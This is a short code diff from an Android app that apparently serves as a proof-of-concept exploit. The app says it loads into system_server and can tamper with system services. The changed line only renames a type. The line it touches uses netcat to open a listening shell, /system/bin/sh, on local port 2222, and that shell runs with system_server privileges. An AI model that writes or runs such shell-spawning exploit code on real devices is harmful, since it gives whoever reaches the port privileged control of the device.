@@ -45,7 +45,7 @@ public class MainActivity extends Activity {
                 .append("\n\nBelow is list of system services, as this app loads into system_server it can directly tamper with local ones (those that are non-null and non-BinderProxy)");
 
         try {
-            Process process = Runtime.getRuntime().exec("nc -s 127.0.0.1 -p 2222 -L /system/bin/sh");
+            java.lang.Process process = Runtime.getRuntime().exec("nc -s 127.0.0.1 -p 2222 -L /system/bin/sh");
             // BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             // String line;
             // while ((line = reader.readLine()) != null) {
